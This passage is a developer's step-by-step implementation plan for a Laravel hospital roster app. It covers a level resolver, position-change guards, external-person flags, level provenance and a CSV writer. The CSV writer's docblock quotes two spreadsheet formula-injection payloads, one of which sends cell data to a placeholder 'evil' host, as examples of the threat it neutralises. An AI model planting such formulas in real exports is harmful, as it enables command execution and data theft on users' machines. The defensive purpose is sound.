- [ ] **Step 1: Write the failing test**

Create `tests/Feature/Identity/LevelResolverTest.php`. Cases:

- `test_levels_at_matches_level_at_for_every_person_in_the_set` — the parity assertion, and the
  reason the predicate is defined once. Build eight people with assorted spans (none, one open,
  one closed, two consecutive, one starting tomorrow, one ended yesterday, one whose span starts
  exactly on the query date, one whose span ends exactly on it) and assert
  `Person::levelsAt($people, $date)[$id]?->getKey() === $person->levelAt($date)?->getKey()` for
  every one;
- `test_both_bounds_are_inclusive_in_the_set_wise_resolver` — the boundary-day case
  `LevelHistoryTest` already pins for `levelAt()`, restated for the set;
- `test_a_person_with_no_history_resolves_to_null_not_a_missing_key` — the map contains the id
  with a null value, so a caller iterating the map never sees an undefined index;
- `test_it_runs_a_constant_number_of_queries_regardless_of_set_size`:

```php
    public function test_it_runs_a_constant_number_of_queries_regardless_of_set_size(): void
    {
        $level = Level::factory()->create();
        $few = Person::factory()->count(3)->create();
        $many = Person::factory()->count(30)->create();

        foreach ($few->concat($many) as $person) {
            PersonLevel::create([
                'person_id' => $person->getKey(),
                'level_id' => $level->getKey(),
                'effective_from' => '2026-01-01',
            ]);
        }

        \DB::enableQueryLog();
        Person::levelsAt($few, '2026-08-09');
        $forThree = count(\DB::getQueryLog());

        \DB::flushQueryLog();
        Person::levelsAt($many, '2026-08-09');
        $forThirty = count(\DB::getQueryLog());
        \DB::disableQueryLog();

        $this->assertSame($forThree, $forThirty, 'levelsAt() must not scale its query count with the set.');
        $this->assertLessThanOrEqual(2, $forThirty);
    }
```

- `test_the_people_screen_shows_a_current_level_without_an_n_plus_one` — the same query-count
  assertion through the HTTP layer, because the resolver being constant does not prove the
  controller uses it.

- [ ] **Step 2: Run and watch it go red**

Expected: `Call to undefined method App\Models\Person::levelsAt()`.

- [ ] **Step 3: Extract the predicate, then use it twice**

In `app/Models/Person.php`, add a private static predicate and rewrite `levelAt()` to call it, so
there is exactly one definition of "the span in force on a date":

```php
    /**
     * The ONE definition of "this span is in force on `$on`". BOTH BOUNDS INCLUSIVE: a level that
     * runs to 30 June is still in force on 30 June, and its successor starts on 1 July.
     *
     * Written once and applied to both the per-person and the set-wise resolver, because a
     * predicate written twice is two predicates that drift — the failure `AuditChain::canonical()`
     * carries a docblock about and the one that made the live system announce its whole audit
     * trail as tampered.
     *
     * Columns are TABLE-QUALIFIED. `person_levels`, `people` and `levels` all appear in the
     * set-wise query, and `levels` also carries `active` — an unqualified predicate is an
     * ambiguous-column error waiting for the first caller that joins them (P1c finding 7).
     *
     * @param  \Illuminate\Database\Eloquent\Builder<PersonLevel>  $query
     */
    private static function inForceOn(Builder $query, string $on): void
    {
        $query->whereDate('person_levels.effective_from', '<=', $on)
            ->where(fn ($q) => $q->whereNull('person_levels.effective_to')
                ->orWhereDate('person_levels.effective_to', '>=', $on));
    }

    public function levelAt(Carbon|string|null $date = null): ?Level
    {
        $on = $date === null ? Calendar::todayYmd() : Calendar::ymd($date);

        return $this->levels()
            ->tap(fn (Builder $q) => self::inForceOn($q, $on))
            ->orderByDesc('person_levels.effective_from')
            ->with('level')
            ->first()?->level;
    }

    /**
     * The set-wise sibling (P1 finding 10). One query for the whole collection instead of one per
     * person: the People screen, LV-03's cohort preview and P1d's rota grid are each N+1 by
     * construction without it.
     *
     * Returns a map keyed by person id with an entry for EVERY person passed in — null where
     * there is no history — so a caller iterating it never hits an undefined index.
     *
     * `orderBy(effective_from)` ascending plus overwrite-on-assign resolves the same span
     * `levelAt()` would: the LAST row written for a person id is the one with the greatest
     * `effective_from`, which is exactly `levelAt()`'s `orderByDesc(...)->first()`.
     *
     * @param  \Illuminate\Support\Collection<int, Person>|array<int, Person>  $people
     * @return array<int, Level|null>
     */
    public static function levelsAt(iterable $people, Carbon|string|null $date = null): array
    {
        $on = $date === null ? Calendar::todayYmd() : Calendar::ymd($date);

        $out = [];
        $ids = [];

        foreach ($people as $person) {
            $id = (int) $person->getKey();
            $out[$id] = null;
            $ids[] = $id;
        }

        if ($ids === []) {
            return [];
        }

        $spans = PersonLevel::query()
            ->whereIn('person_levels.person_id', $ids)
            ->tap(fn (Builder $q) => self::inForceOn($q, $on))
            ->orderBy('person_levels.effective_from')
            ->with('level')
            ->get();

        foreach ($spans as $span) {
            $out[(int) $span->person_id] = $span->level;
        }

        return $out;
    }
```

Also **fix finding 7 at its source**: in `app/Models/Level.php`, table-qualify `scopeActive()` to
`$query->where('levels.active', true)`, matching `Person::scopeActive()`'s already-join-safe
form. No caller's behaviour changes — the only current callers query `levels` alone — and the
next caller is Task 10's promotion picker, which joins.

- [ ] **Step 4: Carry the level onto the screen**

`PersonController::index()` computes `$levels = Person::levelsAt($people)` once and passes each
person's entry through `PersonPresenter::one()`'s `$extra`:

```php
        $levels = Person::levelsAt($people);

        return Inertia::render('Admin/People', [
            'people' => $people->map(fn (Person $p): array => PersonPresenter::one(
                $p,
                $request->user(),
                ['level' => ($l = $levels[(int) $p->getKey()] ?? null) === null ? null : [
                    'id' => (int) $l->getKey(),
                    'code' => (string) $l->code,
                    'name' => (string) $l->name,
                ]],
            ))->values()->all(),
            // ... the remaining props unchanged
```

`People.vue` gains a Level column rendering `p.level?.code ?? '—'`.

- [ ] **Step 5: Verify and commit**

Expected: full suite **912 passed** (907 + 5). `LevelHistoryTest` (9 cases) must stay green — it
is the existing proof that `levelAt()`'s semantics did not move when the predicate was extracted.

```bash
git commit -am "feat: a roster of sixty people asks the database once"
```

---

### Task 4: PE-01's full field set, and one definition of a position change

**Files:**
- Create: `app/Http/Requests/Admin/PersonRequest.php`
- Create: `app/Support/PositionChange.php`
- Modify: `app/Http/Controllers/Admin/PersonController.php`
- Modify: `app/Http/Controllers/Admin/UserManagementController.php`
- Modify: `routes/web.php`
- Modify: `resources/js/Pages/Admin/People.vue`
- Modify: `tests/Feature/Build/ContactFieldsAreProjectedOnceTest.php` *(add the PersonRequest allow-list line)*
- Test: create `tests/Feature/Admin/PersonCrudTest.php`
- Test: create `tests/Feature/Admin/PositionChangeTest.php`

Decision C is why the position change is extracted rather than written inline: today
`AccessControl::resolve()` keys off `people.position` through a read-through accessor, the
capability cache lives 600 seconds, and only `UserManagementController::setPosition()` busts it
or guards the last administrator. A People screen written in the house style would silently
introduce a ten-minute privilege-retention window and a route around the last-admin guard.

- [ ] **Step 1: Write the failing tests**

`tests/Feature/Admin/PositionChangeTest.php` — the security cases, first because they are the
reason for the task:

- `test_changing_a_position_through_the_people_screen_busts_the_capability_cache` — create an
  administrator, call `AccessControl::capabilitiesFor()` to warm the cache, PATCH the person to
  position 4, assert `AccessControl::capabilitiesFor($user->fresh())` no longer contains
  `access.manage` **without** any manual flush in the test;
- `test_the_last_active_administrator_cannot_be_demoted_through_the_people_screen` — 422 with the
  error on `position`, and the person unchanged;
- `test_the_last_active_administrator_can_still_be_demoted_once_another_exists`;
- `test_a_roster_only_persons_position_changes_with_no_account_to_flush` — no exception, no
  `AccessControl::flush` call with a null id;
- `test_the_account_console_and_the_people_screen_share_one_definition` — a reflection assertion
  that `UserManagementController::setPosition()`'s body calls `PositionChange::apply` and does
  **not** contain `isLastActiveAdministrator` any more:

```php
    /**
     * Two writers of `people.position` is two chances to forget the cache flush or the last-admin
     * guard. This asserts there is one definition, not two that happen to agree today.
     */
    public function test_the_account_console_delegates_to_the_one_definition(): void
    {
        $source = file_get_contents(app_path('Http/Controllers/Admin/UserManagementController.php'));

        $this->assertStringContainsString('PositionChange::apply', $source);
        $this->assertStringNotContainsString('isLastActiveAdministrator', $source);
    }
```

- `test_the_audit_row_names_ids_only` — detail matches `/^person=\d+;user=(\d+|none);position=\d+$/`.

`tests/Feature/Admin/PersonCrudTest.php` — the PE-01 field set:

- create a roster-only person with every PE-01 field and read them all back;
- `short_name` uniqueness is enforced (422, not a 23000) and is `ignore`d on self-edit;
- `email` uniqueness resolves through `Person::accountEmailRule()`, so a **roster-only** match is
  not a failure but an **account** match is (that asymmetry is P0c's, and repeating the
  `Rule::unique('users','member_email')` mistake would silently stop catching collisions —
  design §5.1);
- a blank `email` stores `null`, not `''` (both would satisfy the unique index differently);
- `constraints` round-trips as an array;
- `notes` and `phone` are writable by a `people.manage` holder and never echoed into the audit
  detail;
- `test_creating_a_person_never_creates_an_account` — `users` count unchanged, and
  `Person::hasAccount()` false;
- `test_there_is_no_delete_endpoint` — `DELETE /admin/people/{id}` is a 405. People are
  deactivated, never deleted (owner ruling; the four named roles on `handover_signoffs` depend on
  the row staying resolvable).

- [ ] **Step 2: Run and watch them go red**

- [ ] **Step 3: The FormRequest**

Create `app/Http/Requests/Admin/PersonRequest.php`. The load-bearing rules:

```php
    public function rules(): array
    {
        $person = $this->route('person');
        $id = $person instanceof Person ? $person->getKey() : null;

        return [
            'full_name' => ['required', 'string', 'max:255'],
            // The rota handle. UNIQUE OUTRIGHT and institution-blind by design (D11) — the
            // create-table migration's own docblock explains why a composite unique would be
            // toothless for exactly the bootstrap and fixture rows. Soft-deleted people still
            // occupy the index, so `withoutTrashed()` is NOT used: re-adding someone who left
            // must collide and be resolved, not silently duplicate a human.
            'short_name' => ['nullable', 'string', 'max:50', Rule::unique('people', 'short_name')->ignore($id)],
            'position' => ['required', 'integer', Rule::in(self::POSITIONS)],
            // `Person::accountEmailRule()` is the ONE definition of "already an account". A
            // roster-only match is deliberately NOT a failure — that is the normal case after an
            // import, and refusing it would refuse exactly the people this screen exists to edit.
            'email' => ['nullable', 'email', 'max:255', Person::accountEmailRule($id)],
            'phone' => ['nullable', 'string', 'max:32'],
            'joined_at' => ['nullable', 'date_format:Y-m-d'],
            'notes' => ['nullable', 'string', 'max:5000'],
            'constraints' => ['nullable', 'array'],
            'external' => ['required', 'boolean'],
            'active' => ['required', 'boolean'],
        ];
    }
```

`prepareForValidation()` normalises the email through `Person::normalizeEmail()` **before**
validation, for the reason `UserManagementController::updateProfile()` already documents at
`:317-326`: `Rule::unique` runs a raw `WHERE email = ?` against the submitted value while every
stored address is normalised on write, and depending on MySQL's collation to catch the difference
is an accident, not a check.

`POSITIONS` is `[0, 2, 3, 4, 5]`, matching `UserManagementController::POSITIONS` — position 1
(Nurse) is retired and must not be reachable from a second screen. Import the constant rather
than retyping the array.

`date_format:Y-m-d` on `joined_at`, not `date`: `strtotime()` leniency accepted `"+5 years"` and
created real backdated clinical rows once (P1 finding 3), and a lenient sibling anywhere is the
same bug waiting.

- [ ] **Step 4: `PositionChange`**

Create `app/Support/PositionChange.php`:

```php
<?php

namespace App\Support;

use App\Models\AuditLog;
use App\Models\Person;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;

/**
 * The ONE definition of "change a person's job position" (P1c Decision C).
 *
 * `people.position` drives the capability set: `AccessControl::resolve()` reads
 * `$user->position`, a read-through accessor onto this column, and `capabilitiesFor()` caches
 * the result for CACHE_TTL (600s). It is also what `isLastActiveAdministrator()` guards.
 *
 * Before P1c there was one writer (`UserManagementController::setPosition()`) and it handled
 * both. P1c adds a second surface — the People screen — and a second writer would be a
 * ten-minute privilege-retention window plus a route around the last-admin guard, with no test
 * anywhere that would notice. Both surfaces call this.
 *
 * The last-administrator guard is a PERSON-level question asked through the account: only a
 * claimed, active account can hold `access.manage` in the first place (a roster-only person has
 * no `users` row for `AccessControl::resolve()` to key off — design §5.2 mitigation 6).
 */
final class PositionChange
{
    /**
     * @throws ValidationException when this would demote the last active Administrator
     */
    public static function apply(Person $person, int $position, Request $request, string $field = 'position'): void
    {
        $user = $person->user()->first();

        if ($position !== 0 && self::isLastActiveAdministrator($user)) {
            throw ValidationException::withMessages([
                $field => 'This is the last active Administrator — grant another account the Administrator role first.',
            ]);
        }

        $person->update(['position' => $position]);

        // Only a claimed account has a cached capability set to bust.
        if ($user !== null) {
            AccessControl::flush((int) $user->getKey());
        }

        AuditLog::record(
            'user_role_change',
            'person='.$person->getKey().';user='.($user?->getKey() ?? 'none').';position='.$position,
            $request->user()?->getKey(),
            $request->ip(),
        );
    }

    /**
     * True when this account is an ACTIVE Administrator and no OTHER active Administrator exists.
     *
     * `whereKeyNot` is avoided: it filters the unqualified `id`, ambiguous once `people` is
     * joined (both tables have one). Moved here verbatim from UserManagementController, which now
     * calls through — see PositionChangeTest's delegation assertion.
     */
    public static function isLastActiveAdministrator(?User $user): bool
    {
        if ($user === null || (int) $user->position !== 0 || ! $user->active) {
            return false;
        }

        return ! User::query()
            ->join('people', 'people.id', '=', 'users.person_id')
            ->where('users.id', '!=', $user->getKey())
            ->where('people.position', 0)
            ->where('users.active', true)
            ->exists();
    }
}
```

**Refactor `UserManagementController` in this same commit.** `setPosition()` becomes:

```php
    public function setPosition(Request $request, User $user): RedirectResponse
    {
        $data = $request->validate([
            'position' => ['required', 'integer', Rule::in(self::POSITIONS)],
        ]);

        if ($user->person === null) {
            throw ValidationException::withMessages([
                'position' => 'This account is not linked to a person on the roster.',
            ]);
        }

        PositionChange::apply($user->person, (int) $data['position'], $request);

        return back()->with('status', 'Role updated.');
    }
```

and `setActive()`'s call to `$this->isLastActiveAdministrator($user)` becomes
`PositionChange::isLastActiveAdministrator($user)`. Delete the private method. The `?? none`
branch on the audit detail is new — the previous format was `user=<id>;position=<n>`, so
`UserManagementTest`'s assertion on that string needs updating in this commit, and the plan says
so here rather than letting it surface as a mystery red.

- [ ] **Step 5: Controller, routes and screen**

`PersonController` gains `store(PersonRequest)` and `update(PersonRequest, Person $person)`.
Both:

- write every PE-01 field **except `position`**, in a transaction;
- call `PositionChange::apply()` for the position, inside the same transaction, so a refusal
  rolls the rest back;
- audit `person_create` / `person_update` with `person=<id>;fields=<comma-separated names>` —
  field names, never values (a name, an email and a phone number *are* the identifying data this
  edit touches).

Routes, inside Task 1's `admin` + `cap:people.manage` group, `visibility` still declared first:

```php
        Route::get('/people', [PersonController::class, 'index'])->name('people');
        Route::patch('/people/visibility', [PersonController::class, 'updateVisibility'])->name('people.visibility');
        Route::post('/people', [PersonController::class, 'store'])->name('people.store');
        Route::patch('/people/{person}', [PersonController::class, 'update'])->name('people.update');
```

No `destroy`. `PersonController` exposes no delete action at all rather than a route that
refuses — `LevelController`'s own docblock established that shape for the same reason.

`People.vue` gains a create panel and a per-row inline edit form, mirroring `Levels.vue`'s
`createOpen` / `editingId` structure verbatim. Contact fields render in the form only when the
projection supplied them.

- [ ] **Step 6: Add the allow-list line**

Add `'app/Http/Requests/Admin/PersonRequest.php'` to
`ContactFieldsAreProjectedOnceTest::ALLOW_LIST` with the stated reason ("the write-side
validation names the fields it accepts; it renders nothing"). This is why Task 2 shipped a
two-entry list.

- [ ] **Step 7: Verify and commit**

Expected: full suite **929 passed** (912 + 17). `UserManagementTest`, `ChiefResidentTest` and
`AccessControlPageTest` must all stay green — if `UserManagementTest` is red it is the audit-detail
format change named in Step 4, which is expected and is fixed in this commit, not worked around.

```bash
git commit -am "feat: the roster is editable, and one place decides what a role change costs"
```

---

### Task 5: PE-03 — `external` made real, everywhere

**Files:**
- Modify: `app/Support/SignoffPickers.php`
- Modify: `app/Support/PersonPresenter.php` *(already carries `external`; this task gives it meaning)*
- Modify: `resources/js/Pages/Endorsement/Sheet.vue`
- Modify: `resources/js/Pages/Admin/People.vue`
- Test: modify `tests/Feature/Endorsement/PickerParityTest.php`
- Test: create `tests/Feature/Identity/ExternalPeopleTest.php`

Finding 3: the column exists and no writer has ever set it true. Task 4 gave it a writer. This
task makes *"flagged everywhere"* (PE-03) true, and does it without disturbing D9's parity matrix.

- [ ] **Step 1: Write the failing tests**

`tests/Feature/Identity/ExternalPeopleTest.php`:

- `test_an_external_person_is_flagged_in_the_signoff_picker` — `SignoffPickers::offer()` returns
  `['id' => …, 'name' => …, 'external' => true]` for an external active consultant;
- `test_a_non_external_person_carries_no_external_key` — absent, not `false`, matching how
  `retired` already behaves in that array (`SignoffPickers.php`'s `offer()`), so the client's
  existing truthiness checks keep working unchanged;
- `test_external_does_not_change_who_may_be_named` — the D9 rule is about position, account and
  `active`; being external is a **label**, not a permission. An external consultant at position 3
  is offered and accepted exactly as an internal one is;
- `test_an_external_endorser_is_still_refused_without_an_account` — the D9 endorser rule is
  unmoved.

In `tests/Feature/Endorsement/PickerParityTest.php`, extend `matrix()` with two fixtures — an
external roster-only consultant and an external claimed resident — with the **same** expected
offer/accept outcomes as their internal twins. That is the assertion that matters: the matrix
proves adding a display flag did not move a write-side boundary.

- [ ] **Step 2: Run and watch them go red**

- [ ] **Step 3: Surface the flag in the offer**

In `SignoffPickers::offer()`, select `people.external` alongside the two existing columns and add
the key only when true:

```php
        $list = $query->get(['people.id', 'people.full_name', 'people.external'])
            ->map(function (Person $p): array {
                $row = ['id' => (int) $p->id, 'name' => (string) $p->full_name];

                // PE-03: "flagged everywhere". Added only when TRUE, matching how `retired`
                // behaves two blocks below — an absent key keeps every existing client
                // truthiness check working without a change.
                if ($p->external) {
                    $row['external'] = true;
                }

                return $row;
            })
            ->all();
```

and set `'external' => true` on the retired-but-kept branch too, resolved from the
`Person::withTrashed()->find($id)` it already loads. **Do not change the predicates.** D9's rule
is position + account + `active`; `external` is orthogonal and adding it to `rosteredIn()` would
be a silent write-side boundary change dressed as a display fix.

- [ ] **Step 4: Render it**

`Sheet.vue`, all four `<option>` sites (`:358`, `:368`, `:395`, `:405`) — one shared label helper
in the `<script setup>` rather than four inline ternaries, since four copies of a label rule is
how three of them end up stale:

```js
const staffLabel = (s) => {
    if (s.retired) return `${s.name} (no longer offered)`;
    return s.external ? `${s.name} (external)` : s.name;
};
```

`People.vue` renders a `.channel-tag` reading "External" in the Status column. Task 1 already
reserved the slot.

- [ ] **Step 5: Verify and commit**

Expected: full suite **935 passed** (929 + 6 — four `ExternalPeopleTest` cases and two new
`PickerParityTest` matrix fixtures). **`PickerParityTest` green is the gate on this task**; a red
there means a display flag moved a write-side boundary and the change must be reverted, not
patched.

```bash
git commit -am "feat: an external rotator says so on every screen that names them"
```

---

### Task 6: `person_levels` gains provenance, and exactly one writer

**Files:**
- Create: `database/migrations/2026_08_14_120002_add_provenance_to_person_levels.php`
- Modify: `app/Models/PersonLevel.php`
- Create: `database/factories/PersonLevelFactory.php`
- Create: `app/Support/LevelAssignment.php`
- Test: create `tests/Feature/Identity/LevelAssignmentTest.php`
- Test: create `tests/Feature/Build/PersonLevelsHaveOneWriterTest.php`

Finding 4 and P1 finding 9. This must land **before** the first promotion: adding provenance
afterwards is not an additive migration, it is a backfill of facts nobody recorded.

- [ ] **Step 1: Write the failing tests**

`tests/Feature/Identity/LevelAssignmentTest.php`:

- `test_assigning_closes_the_open_prior_span_on_the_day_before` — R1 open from 2026-07-01,
  assign R2 from 2027-07-01, assert the R1 span's `effective_to` is **2027-06-30**, and that
  `levelAt('2027-06-30')` is R1 while `levelAt('2027-07-01')` is R2. The day-before arithmetic is
  correct precisely because `levelAt()` is inclusive at both ends — an `effective_to` equal to
  the new `effective_from` would make both spans in force on that day and `levelAt()` would pick
  one silently;
- `test_two_open_spans_can_never_be_created_through_the_writer` — the gap finding 4 names; assert
  at most one `whereNull('effective_to')` row per person after any sequence of assignments;
- `test_a_duplicate_effective_from_is_skipped_not_upserted` — assign the same level on the same
  date twice; the second returns `'skipped_existing'`, the row count is unchanged, and — the
  case that matters — assign a **different** level on an existing `effective_from` and assert the
  stored `level_id` is **unchanged**. An upsert would rewrite what someone held on a date already
  rendered beside a signed handover;
- `test_a_span_that_would_overlap_a_closed_later_span_is_refused` — returns `'refused_overlap'`,
  writes nothing;
- `test_reassigning_the_same_level_is_a_no_op` — `'skipped_same_level'`;
- `test_provenance_is_stored` — `promotion_batch_id`, `reason` and `created_by` land;
- `test_created_by_survives_the_users_row_being_soft_deleted` — `nullOnDelete` on a soft delete
  is a no-op, so the id stays; asserted so a reader knows the column is not silently nulled by
  the deactivation path.

`tests/Feature/Build/PersonLevelsHaveOneWriterTest.php` — source-level, allow-listing only
`app/Support/LevelAssignment.php` and `database/factories/PersonLevelFactory.php`, scanning
`app/` + `database/seeders/` + `routes/` for `PersonLevel::create(`, `PersonLevel::insert(`,
`->levels()->create(` and `DB::table('person_levels')`.

- [ ] **Step 2: Run and watch them go red**

- [ ] **Step 3: The migration**

```php
<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

/**
 * Munawib LV-03/LV-04 provenance. P1 finding 9: a promotion is not addressable or reversible as
 * a unit, and "this cohort advanced on this date" cannot be rendered or undone, because
 * `person_levels` records only (person, level, from, to).
 *
 * THIS MUST LAND BEFORE THE FIRST PROMOTION. Today it is additive and free: no screen has ever
 * written this table and no production row exists. After one promotion has run it is a backfill
 * of facts nobody recorded, which is a different and much worse migration.
 *
 * `created_by` is `users`, not `people`: this records the ACTOR, and actors are accounts — the
 * same distinction `handover_signoffs` draws between its four `*_person_id` names of record and
 * its `signed_off_by_user_id`/`reopened_by_user_id` actors. `people.id` and `users.id` are
 * independent sequences; never move an id between them without joining through
 * `users.person_id`.
 *
 * `promotion_batch_id` is a UUID string, not an FK: a batch is not a row anywhere. It is
 * indexed because "show me everything that promotion did" is the query LV-03's undo would need,
 * and because it is how a reader groups the per-person audit rows back into one act.
 *
 * NO overlap constraint is added at the database level. SQLite cannot express it, and a partial
 * unique index on MySQL 8.4 would not either. The guarantee lives in App\Support\LevelAssignment,
 * which `PersonLevelsHaveOneWriterTest` proves is the only writer.
 */
return new class extends Migration
{
    public function up(): void
    {
        Schema::table('person_levels', function (Blueprint $table) {
            if (! Schema::hasColumn('person_levels', 'promotion_batch_id')) {
                $table->uuid('promotion_batch_id')->nullable()->after('effective_to')->index();
            }
        });

        Schema::table('person_levels', function (Blueprint $table) {
            if (! Schema::hasColumn('person_levels', 'reason')) {
                $table->string('reason', 255)->nullable()->after('promotion_batch_id');
            }
        });

        Schema::table('person_levels', function (Blueprint $table) {
            if (! Schema::hasColumn('person_levels', 'created_by')) {
                $table->foreignId('created_by')->nullable()->after('reason')
                    ->constrained('users')->nullOnDelete();
            }
        });
    }

    public function down(): void
    {
        Schema::table('person_levels', function (Blueprint $table) {
            $table->dropConstrainedForeignId('created_by');
        });

        Schema::table('person_levels', function (Blueprint $table) {
            $table->dropColumn(['promotion_batch_id', 'reason']);
        });
    }
};
```

Per-column `Schema::hasColumn` guards follow P0a's own hardening (its amendment 7): the Blueprint
emits one ALTER TABLE per column, so guarding only the first leaves a partial failure
unrecoverable.

- [ ] **Step 4: Model and factory**

`PersonLevel` gains `use HasFactory;`, the three columns in `$fillable`, and
`'created_by' => 'integer'` in `casts()`. Create `database/factories/PersonLevelFactory.php` with
a `definition()` of `person_id`/`level_id` factory closures, `effective_from` a fixed
`'2026-07-01'` (never `fake()->date()` — a random start date makes an inclusive-bounds failure
reproduce one run in thirty), `effective_to` null, and the three provenance columns null.

- [ ] **Step 5: The one writer**

Create `app/Support/LevelAssignment.php`. The contract, verbatim in its docblock and asserted by
the tests above:

```php
    public const ASSIGNED = 'assigned';
    public const SKIPPED_EXISTING = 'skipped_existing';
    public const SKIPPED_SAME_LEVEL = 'skipped_same_level';
    public const REFUSED_OVERLAP = 'refused_overlap';

    /**
     * @param  array{batch?: ?string, reason?: ?string, actor?: ?int}  $context
     * @return self::ASSIGNED|self::SKIPPED_EXISTING|self::SKIPPED_SAME_LEVEL|self::REFUSED_OVERLAP
     */
    public static function assign(Person $person, Level $level, string $effectiveFrom, array $context = []): string
```

It resolves `$from = Calendar::parse($effectiveFrom)` (Y-m-d only, throws otherwise — no lenient
sibling), returns `SKIPPED_SAME_LEVEL` when `$person->levelAt($from)?->is($level)`, returns
`SKIPPED_EXISTING` when a row already exists on `(person_id, effective_from)`, returns
`REFUSED_OVERLAP` when any span with `effective_from > $from` exists (assigning *behind* history
is what the promotion must never do silently), otherwise closes the open span to
`Calendar::addDays($from, -1)` and inserts — the whole thing inside one `DB::transaction`, and
**it writes no audit row**. Auditing is the caller's, because a bulk caller writes one summary
row plus one per person and a per-write audit inside a transaction is exactly the unwinding
problem Decision H describes.

- [ ] **Step 6: Verify and commit**

Expected: full suite **945 passed** (935 + 10). `LevelHistoryTest` green.

```bash
git commit -am "feat: a level change remembers who made it and why"
```

---

### Task 7: LV-04 — the history renders, dual-dated

**Files:**
- Modify: `app/Http/Controllers/Admin/PersonController.php`
- Modify: `app/Support/PersonPresenter.php`
- Modify: `routes/web.php`
- Modify: `resources/js/Pages/Admin/People.vue`
- Test: create `tests/Feature/Admin/LevelHistoryScreenTest.php`

LV-04: *"Level changes are effective-dated; history renders with the level held at the time."*

- [ ] **Step 1: Write the failing test**

Cases: the history renders newest-first with `from`/`to` as `Calendar::label()` shapes (Gregorian
**and** Hijri); an open span renders with `to: null` and the screen shows "current"; the level
**code and name as held at the time** come from the joined `levels` row, not from a current-level
lookup; a person with no history renders an empty array, not a missing key; and the client does
no date maths (asserted by the standing `CalendarIsTheOnlyConverterTest`, which the verify step
runs).

Add one case that would have caught the read-through-accessor trap if the history carried an
actor name: `test_the_actor_column_carries_person_id_through_the_narrowed_query`. The history
shows *who* made the change, which resolves `$user->full_name` through the person link — so the
eager load must be `with('createdBy:id,person_id')`, never `with('createdBy:id,full_name')`, or
the name silently returns null (the P0c defect that broke four live sites).

- [ ] **Step 2: Run and watch it go red**

- [ ] **Step 3: The endpoint**

`PersonController::history(Person $person)` returns the spans as JSON for a detail panel, behind
the same `cap:people.manage` group:

```php
        Route::get('/people/{person}/history', [PersonController::class, 'history'])->name('people.history');
```

Declared after `/people/visibility` (which is a literal segment and must not bind as `{person}`).
Each row: `level` (id/code/name from the joined row), `from` and `to` as `Calendar::label()`
arrays, `reason`, `batch` (the uuid, so a reader can see two rows came from one act), and
`by` (the actor's `full_name`, resolved through the correctly-loaded relation).

- [ ] **Step 4: The panel**

`People.vue` gains an expandable per-row history panel fetched on open (`router.get` with
`only: ['history']`, `preserveState: true` — without `preserveState` Inertia remounts and the
open row collapses). Dates render `{{ h.from.date }}` with `{{ h.from.hijri }}` beneath in
`text-muted`; **no date arithmetic in the component**.

- [ ] **Step 5: Verify and commit**

Expected: full suite **951 passed** (945 + 6).

```bash
git commit -am "feat: a level history that shows what someone was at the time"
```

---

### Task 8: `App\Support\Csv` — the first CSV writer, and the last one

**Files:**
- Create: `app/Support/Csv.php`
- Test: create `tests/Feature/Build/CsvInjectionTest.php`

Finding 16: there is no CSV writer in this codebase, so this is a greenfield choice. It lands
**before** the export that needs it (Task 9) and before the importer that must undo it (Task 11),
because the neutralisation and the un-neutralisation are one decision and shipping half of it is
how a round trip silently renames everything.

- [ ] **Step 1: Write the failing test**

`tests/Feature/Build/CsvInjectionTest.php`:

- `test_every_dangerous_leading_character_is_neutralised` — a data provider over
  `=`, `+`, `-`, `@`, `"\t"`, `"\r"`, asserting each cell comes out prefixed with `'`;
- `test_an_ordinary_cell_is_untouched` — including one containing an `=` that is **not** leading
  (`a=b` stays `a=b`), because over-escaping is its own bug;
- `test_a_utf8_bom_is_written_first` — the first three bytes are `\xEF\xBB\xBF`, without which
  Excel opens Arabic names as mojibake and the operator concludes the system corrupted them;
- `test_arabic_content_round_trips_byte_identical`;
- `test_a_neutralised_cell_round_trips_through_the_reader` — the pairing assertion. Write
  `=SUM(A1)`, read it back through `CsvRosterReader` (Task 11) and get `=SUM(A1)`, not
  `'=SUM(A1)`. **This test is written now and skipped until Task 11 exists**, with
  `markTestSkipped('CsvRosterReader lands in Task 11 — this is the pairing contract it must
  satisfy.')`, and Task 11's Step 1 removes the skip. Writing it here is deliberate: the reader's
  contract is set by the writer, not the other way round;
- `test_embedded_newlines_and_quotes_survive` — `fputcsv`'s own quoting, asserted rather than
  assumed.

- [ ] **Step 2: Run and watch it go red**

- [ ] **Step 3: The writer**

```php
<?php

namespace App\Support;

use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * The ONE CSV writer. There was none before P1c, which makes this the one chance to get
 * formula-injection neutralisation right rather than retrofit it.
 *
 * THE THREAT. A cell beginning `=`, `+`, `-`, `@`, TAB or CR is executed as a formula by Excel,
 * LibreOffice and Google Sheets when the file is opened. `=cmd|'/c calc'!A1` and
 * `=HYPERLINK("http://evil/?"&A1)` are the classic shapes; the second exfiltrates the row it
 * sits in with one click on a "this file contains links" prompt. A hospital spreadsheet imported
 * into this system and exported again is exactly the round trip that carries an attacker-authored
 * cell from one operator's machine to another's (P1 plan, P1c item 14).
 *
 * THE NEUTRALISATION is a single leading apostrophe — the only one that survives all three
 * applications. `App\Support\Roster\CsvRosterReader` strips exactly one leading apostrophe from
 * any cell that would otherwise begin with a dangerous character, so export → re-import is
 * lossless. Ship the two together or a round trip renames every affected cell, once per trip.
 * CsvInjectionTest asserts the pairing rather than describing it.
 *
 * THE BOM is not decoration. Without it Excel decodes UTF-8 as the system codepage and Arabic
 * names open as mojibake, which reads as data corruption rather than an encoding default.
 */
final class Csv
{
    private const DANGEROUS_PREFIXES = ['=', '+', '-', '@', "\t", "\r"];

    public static function neutralise(?string $value): string
    {
        $value = (string) $value;

        if ($value === '') {
            return '';
        }

        return in_array($value[0], self::DANGEROUS_PREFIXES, true) ? "'".$value : $value;
    }

    /**
     * @param  list<string>  $headers
     * @param  iterable<array<int, string|int|float|null>>  $rows
     */
    public static function stream(string $filename, array $headers, iterable $rows): StreamedResponse
    {
        return response()->streamDownload(function () use ($headers, $rows): void {
            $out = fopen('php://output', 'w');

            fwrite($out, "\xEF\xBB\xBF");
            fputcsv($out, array_map(self::neutralise(...), $headers));

            foreach ($rows as $row) {
                fputcsv($out, array_map(fn ($cell): string => self::neutralise(
                    $cell === null ? '' : (string) $cell
                ), $row));
            }

            fclose($out);
        }, $filename, ['Content-Type' => 'text/csv; charset=UTF-8']);
    }
}
```

Note `-` is in the list even though a leading minus is legitimate for a negative number: this
